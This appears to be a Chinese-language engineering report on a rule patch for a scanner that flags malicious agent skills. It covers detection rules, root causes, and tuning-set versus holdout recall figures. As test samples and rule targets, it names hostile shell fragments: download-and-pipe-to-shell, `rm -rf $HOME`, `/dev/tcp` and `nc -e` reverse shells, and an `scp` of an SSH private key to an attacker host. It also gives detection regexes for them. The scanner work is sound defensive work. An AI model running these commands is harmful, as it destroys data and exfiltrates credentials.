# Skill 扫描器规则补丁 —— 召回 0.60 → 调参集 1.00 / 留出集 0.60

**日期**：2026-11-19
**被测与修改对象**：`LGD-Eval/lgd-gate`（`skillgate.py` / `js_analyzer.py`），基线 `10b3a22`
**性质**：候选补丁（工作副本上验证，原仓未改）

---

## 1. 上一轮测出的问题（FACT）

```
20 样本：TP=6 FP=2 TN=8 FN=4
recall 0.600 / precision 0.750 / FPR 0.200
```

四个漏报：M01 `curl|base64 -d|bash`、M04 `rm -rf $HOME`、M07 `../etc/passwd`、M08 `/dev/tcp`。
两个误报：B02 `requests.get(timeout=10)`、B07 `fetch(...)`。

---

## 2. 根因（读代码定位，不是猜）

| 现象 | 代码位置 | 原因 |
|---|---|---|
| 3 个恶意 shell 全漏 | `skillgate.py:920-926` | shell 规则只有 **5 条**；`curl .* \| sh` 要求字面 `| sh`，`| base64 -d \| bash` 天然绕过；`rm -rf /` 只匹配根目录 |
| `findings.rule_id` 全空 | `Finding` dataclass 有字段（`:293`），但调用点从不赋值 | 报了什么规则无法追溯 |
| B07 误报 | `js_analyzer.py:87` | 例外条件把 `fetch` 也当成"外泄动词"，只读 GET 被判外泄 |
| B02 误报 | `skillgate.py:89` | `import requests` 判 INFO；INFO 也算 findings，于是任何用 requests 的技能都"命中" |

---

## 3. 改了什么（2 文件，+58/−10）

### 3.1 `scan_shell_file`：5 条 → 12 条，全部带 rule_id

| 规则 | 覆盖 |
|---|---|
| SH001 | `rm -rf /` |
| SH002 | 下载后管道执行（`curl\|wget … \| bash/sh/zsh`） |
| SH003/SH004 | chmod 777 / sudo |
| **SH005** | **解码后执行**（`\| base64 -d \| bash`）← 修 M01 |
| **SH006** | **多段管道最终落到 shell** |
| **SH007** | **`rm -rf $HOME` / `~`** ← 修 M04 |
| SH008 | 删除系统关键目录 |
| **SH009** | **`/dev/tcp`** ← 修 M08 |
| SH010 | `nc -e` 反弹 |
| **SH011/SH012** | **凭据文件被网络工具访问/上传** |

### 3.2 `scan_python_file`：新增路径穿越（PY001）

```
open("<含两段 ../ 的路径>")  或  "< /etc|/proc|/root|/var/log 下的路径>"
```

### 3.3 `js_analyzer.py`：外泄动词收窄

`fetch|axios|post|send` → `axios.post|.post|send|upload|writeFileSync`。
只读 GET 不再算外泄。

### 3.4 `skillgate.py`：`requests.get` 收窄

`https?://` → `http://`（明文才报）。HTTPS 普通 GET 不再报。

**没做的**：`import requests` 那条 INFO 规则我**没删**——它是信息性信号，删了会让"用了什么库"这条线索消失。它造成的那 1 个误报，在"仅 LOW 及以上"口径下不计入（见 §5）。

---

## 4. 结果：调参集（20 条）

| 口径 | 版本 | recall | precision | FPR |
|---|---|---|---|---|
| 任意 findings 即命中 | 原始 | 0.600 | 0.750 | 0.200 |
| 任意 findings 即命中 | 补丁 | **1.000** | **0.909** | **0.100** |
| 仅 LOW 及以上 | 原始 | 0.600 | 0.857 | 0.100 |
| 仅 LOW 及以上 | 补丁 | **1.000** | **1.000** | **0.000** |

M01 现在由 SH002+SH005+SH006 三条同时命中，score 82→44（D 级）。
M04→SH007，M07→PY001，M08→SH009。

---

## 5. 但我不能拿 1.00 当结论：留出集打回来了

这 20 条是我写规则时看着改的。所以另建 **10 条未参与调参的 holdout**：

| 口径 | 版本 | recall | precision | FPR |
|---|---|---|---|---|
| 任意命中 | 原始 | 0.400 | 0.667 | 0.200 |
| 任意命中 | **补丁** | **0.600** | **1.000** | **0.000** |

留出集上仍漏两条：

- **H01 `wget -qO- … | python3`**：SH005/SH006 只认 `bash|sh|zsh`，**换成 `python3` 就漏**。
  说明规则是"枚举解释器"，不是"任意解释器 + 管道执行"——真正的修法是判定"管道右端是否为可执行解释器"，而不是加一个词。
- **H02 `scp ~/.ssh/id_rsa attacker@host:`**：只有 curl/wget 被覆盖，`scp/rsync/ftp` 这类复制型外传未覆盖。

**所以诚实的口径是**：

> 调参集 recall 1.00（对已知形态），**留出集 recall 0.60**。
> 真实世界召回率介于两者之间，且**显著低于 1.00**。

这就是"断崖式领先"该有的样子——**先把 0.60→0.60 说清楚，再说提升**。

---

## 6. `rule_id` 现在有值了（可追溯）

```
M01 rules=['SH002','SH005','SH006']
M04 rules=['SH007']
M07 rules=['PY001']
M08 rules=['SH009']
```

第七轮任务书 A「规则与测试用例双向追踪」的最小前提，现在成立了一半：**规则侧有编号，用例侧还没有与 rule_id 绑定的回归断言**（下一步）。

---

## 7. 剩余风险（必须写清）

| 风险 | 级别 | 说明 |
|---|---|---|
| 规则是我按这 20 条写的，存在过拟合 | **P0（方法学）** | 留出集已证明 gap=0.40；需要第三方独立语料 |
| 正则层天花板 | P1 | H01 暴露：枚举式正则在"换解释器/换工具"面前天然失效；要真正解决需 AST/污点分析（任务书 P1-6 原话） |
| `import requests` INFO 仍会造成"任意命中"口径下的误报 | P2 | 口径问题，非逻辑错误 |
| 未跑真实 skill 生态 | P1 | 119 个 SKILL.md 未作为回归集；可能引入新误报 |
| 未与竞品同语料 | BLOCKED | 需对方账号/API，属对外动作 |

---

## 8. 下一轮的具体修法（不写进本补丁）

1. **管道右端解释器识别**：不枚举 `bash|sh`，而是匹配 `\|\s*\S*(python|node|perl|ruby|php|bash|sh|zsh)\b` + `\|` 链
2. **复制型外传**：`scp|rsync|ftp|sftp` 且携带 `~/.ssh|.env|.aws`
3. **规则级回归**：把 rule_id 写进用例断言（`assert 'SH005' in rules`），这样改规则就跑得出来
4. **真实语料回归**：拿 119 个 SKILL.md 跑一遍，把误报清单作为"必须为 0"的验收项

---

## 9. 应用（待批准）

```powershell
git checkout -b fix/skillgate-shell-coverage
git apply proposals/p30_redteam_bench/skillgate_rules.patch
python run_redteam_bench.py                     # 调参集
$env:BENCH_SPLIT='holdout'; python run_redteam_bench.py   # 留出集
```

补丁对原仓 `git apply --check` **exit 0**，原仓 `git status` 干净。
